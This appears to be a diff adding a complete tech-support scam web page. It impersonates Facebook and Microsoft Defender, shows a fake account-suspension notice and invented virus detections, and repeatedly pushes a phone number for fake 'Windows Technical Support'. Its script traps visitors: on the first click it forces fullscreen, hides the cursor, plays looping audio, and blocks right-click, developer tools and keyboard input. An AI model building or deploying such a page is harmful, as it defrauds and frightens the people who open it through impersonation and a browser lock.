@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+<meta http-equiv="content-type" content="text/html;charset=utf-8">
+
+    <title>In-Service Apps</title>
+    <style>
+        body {
+            background-image: url('images/bg6.avif');
+            background-size: 100% 100%;
+            background-repeat: no-repeat;
+            background-position: center center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            color: white;
+        }
+
+body.fullscreen {
+    background-image: url('images/f24_desktop_4k_q85.webp');
+    background-size: cover;
+    background-repeat: no-repeat;
+    background-position: center center;
+}
+
+        #support-text {
+            position: absolute;
+            top: 83%;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 24px;
+            text-align: center;
+            width: 100%;
+            font-weight: bold;
+            color: black;
+            display: none;
+            background-color: #205a8c;
+        }
+
+        #support-text span {
+            font-weight: normal;
+        }
+
+        #music {
+            display: none;
+        }
+
+        #modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 9999;
+        }
+
+        #modal-content {
+            background-color: white;
+            border-radius: 5px;
+            max-width: 400px;
+            margin: 100px auto;
+            padding: 20px;
+            text-align: center;
+        }
+
+        #modal-close {
+            cursor: pointer;
+            color: #888;
+            float: right;
+            font-size: 20px;
+            font-weight: bold;
+        }
+
+        #modal-message {
+            color: black;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        #modal-image {
+            margin-bottom: 20px;
+        }
+
+        .modal-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+
+        .modal-buttons button {
+            width: 100px;
+            padding: 10px 0;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background-color 0.3s;
+        }
+
+        .modal-buttons button.accept {
+            background-color: white;
+            color: black;
+        }
+
+        .modal-buttons button.dismiss {
+            background-color: #3b5998;
+            color: white;
+        }
+
+        .modal-buttons button:hover {
+            background-color: rgba(0, 0, 0, 0.8);
+        }
+
+        @keyframes blink {
+            0% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0;
+            }
+            100% {
+                opacity: 1;
+            }
+        }
+
+        .modal-buttons button.dismiss.blinking {
+            animation: blink 2s infinite;
+        }
+
+        #welcomeDiv {
+            display: none;
+            background-color: #272d34;
+            height: auto;
+            width: 100%;
+            position: fixed;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 9999999999;
+            text-align: center;
+        }
+
+        #welcomeDiv p {
+            color: #ffffff;
+            margin-top: 10px;
+            font-size: 17px;
+            line-height: 1.5;
+            opacity: 0.9;
+        }
+
+#scan {
+    position: fixed;
+    background-color: white;
+    height: 450px;
+    border-radius: 4px;
+    width: 45%;
+    padding: 0;
+    z-index: 99;
+    box-shadow: 25px 25px 25px 25px rgba(0,0,0,.4);
+    bottom: 28%;
+    left: 28%;
+    font-family: sans-serif;
+    color: black;
+    display: none;
+}
+    </style>
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+        var isPopupVisible = true;
+        var music = document.getElementById('music');
+        var isPlaying = false;
+
+        function toggleMusic() {
+            if (isPlaying) {
+                music.pause();
+            } else {
+                music.play();
+            }
+            isPlaying = !isPlaying;
+        }
+
+        function playMusicOnClick() {
+            toggleMusic();
+            document.removeEventListener('click', playMusicOnClick);
+        }
+
+        music.addEventListener('click', toggleMusic);
+        document.addEventListener('click', playMusicOnClick);
+
+        var fullscreenEnabled = document.fullscreenEnabled || document.mozFullScreenEnabled || document.documentElement.webkitRequestFullScreen;
+
+        if (fullscreenEnabled) {
+            document.documentElement.requestFullscreen = document.documentElement.requestFullscreen || document.documentElement.mozRequestFullScreen || document.documentElement.webkitRequestFullScreen;
+            document.cancelFullscreen = document.cancelFullscreen || document.mozCancelFullScreen || document.webkitCancelFullScreen;
+
+            var isFullscreen = false;
+
+            document.addEventListener('click', function () {
+                if (!isFullscreen) {
+                    isFullscreen = true;
+                    document.documentElement.requestFullscreen();
+                    document.body.classList.add('fullscreen');
+                    showWelcomeDiv();
+                    showSupportText();
+                }
+            });
+
+            document.addEventListener('fullscreenchange', function () {
+                isFullscreen = !isFullscreen;
+            });
+        }
+
+        var modalOverlay = document.getElementById('modal-overlay');
+        var modalClose = document.getElementById('modal-close');
+
+        function showModal() {
+            modalOverlay.style.display = 'block';
+        }
+
+        function closeModal() {
+            modalOverlay.style.display = 'none';
+        }
+
+        modalClose.addEventListener('click', closeModal);
+
+        showModal();
+
+        function hideCursor() {
+            document.documentElement.style.cursor = 'none';
+        }
+
+        document.addEventListener('click', function () {
+            hideCursor();
+            document.removeEventListener('click', hideCursor);
+
+            if (isPopupVisible) {
+                closeModal();
+                isPopupVisible = false;
+            }
+        });
+
+var acceptButton = document.getElementById('acceptBtn');
+var ignoreButton = document.getElementById('ignoreBtn');
+var scan = document.getElementById('scan');
+
+function enterSecondScreen() {
+    closeModal();
+    document.body.classList.add('fullscreen');
+    scan.style.display = 'block';
+}
+
+acceptButton.addEventListener('click', enterSecondScreen);
+ignoreButton.addEventListener('click', enterSecondScreen);
+
+        document.addEventListener('contextmenu', function (event) {
+            event.preventDefault();
+        });
+
+        document.addEventListener('keydown', function (e) {
+            if (e.ctrlKey && (e.keyCode === 'U'.charCodeAt(0) || e.keyCode === 'u'.charCodeAt(0)) ||
+                e.ctrlKey && (e.keyCode === 'C'.charCodeAt(0) || e.keyCode === 'c'.charCodeAt(0)) ||
+                e.ctrlKey && (e.keyCode === 'S'.charCodeAt(0) || e.keyCode === 's'.charCodeAt(0))) {
+                e.preventDefault();
+            }
+        });
+
+        function preventKeyEvents(event) {
+            const blockedKeyCodes = [123];
+            const keyCode = event.keyCode || event.which;
+
+            if (blockedKeyCodes.includes(keyCode)) {
+                event.preventDefault();
+                console.log(`Key with code ${keyCode} is blocked.`);
+            }
+        }
+
+        window.addEventListener('keydown', preventKeyEvents);
+    });
+
+
+    // Keyboard lock and prevent default
+    if (navigator.keyboard) {
+        navigator.keyboard.lock();
+    }
+
+    document.onkeydown = function (e) {
+        return false;
+    }
+
+
+    function showWelcomeDiv() {
+        var welcomeDiv = document.getElementById('welcomeDiv');
+        welcomeDiv.style.display = 'block';
+    }
+
+
+    function showSupportText() {
+        var supportText = document.getElementById('support-text');
+        supportText.style.display = 'block';
+    }
+
+</script>
+
+</head>
+
+<body>
+    <audio id="music" src="media/text-to-speech.mp3" controls="" loop=""></audio>
+
+    <div id="modal-overlay" style="display: block;">
+        <div id="modal-content">
+            <span id="modal-close">×</span>
+            <img id="modal-image" src="images/logo-facebookpng-32251.jpg" alt="Facebook Logo">
+            <p id="modal-message">Facebook has temporarily Suspended your Account.</p>
+            <div class="modal-buttons">
+                <button id="acceptBtn" class="dismiss blinking">Accept</button>
+	       <button id="ignoreBtn" class="dismiss blinking">Ignore</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="welcomeDiv">
+        <p>
+           Windows Defender Security Has Disabled Your Computer. <br> Please don't access this system. If you overlook this warning, all your security and personal information can be compromised. Running this application may put your system and all your personal information at risk. Please contact Microsoft Windows Support as soon as possible, and a Microsoft expert will guide you through the investigation over the phone. +1-866-949-4603
+        </p>
+    </div>
+
+
+<div id="support-text">
+        <br>
+        <img src="images/msmm.png">
+        <span style="color:#ffffff"><strong>Windows Technical Support +1-866-949-4603 (Toll-free number) </strong></span>
+<marquee direction="left" height="100px" width="100%">
+              <small class="text-left" style="color:#eee;font-size:12px">Windows Defender SmartScreen now prevents unrecognized applications from appearing. Running this application may put your system at risk. Windows Defender scan detected unwanted adware on this device that can steal passwords, online identities, financial information, personal files, photos, and documents。</small>
+            </marquee>
+<br>
+
+    </div>
+
+<div id="scan">
+<div class="ilb2">
+<img src="images/dm.png" style="width:25px;margin:8px 2px 0px 8px">
+<span style="color:#676768;font-size:20px;margin-top:0px;">Microsoft Defender</span>
+
+<div class="minimize" onclick="showd();playSound1();">
+
+          </div> </div>
+
+<p style="margin-left:30px;font-size:30px;font-weight:500;color:#205a8c;">Scanning File, Please wait..</p>
+<img src="images/re.gif" style="width:200px;margin-left:150px;">
+
+<div id="dixon">
+<div class="nen">
+
+<span style="margin-left:10px;color:red">Virus Found ⬦ Trojan.Dropper.Autoit...</span>
+
+</div>
+<div class="nen1">
+
+<span style="margin-left:10px;color:red"> Virus Found ⬦ PUP.Optional.RelevantK..</span>
+
+</div>
+<div class="nen2">
+
+<span style="margin-left:10px;color:red"> Virus Found ⬦ PUP.Optional.DownLoad..</span>
+
+</div>
+<div class="nen3">
+
+<span style="margin-left:10px;color:red">Virus Found ⬦ dware.TopGuard..</span>
+
+</div>
+
+<script src="../www.w3counter.com/tracker3e67.js?id=157782"></script>
+
+</div></div>
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4bc70e2c01a94c73b74392e4234840661791215815920" integrity="sha512-L0ha0OXavK/8okipN9F8BtP84dg9DUhPERbBXzwI6dgTA55d2+yweo3pn5CSFYs45/r8md2+xvUPtTdvTNRfjA==" data-cf-beacon='{"version":"2024.11.0","token":"dd0f0b30ddc946e1915e616c017663da","r":1,"spa":2}' crossorigin="anonymous"></script>
+</body>
+</html>
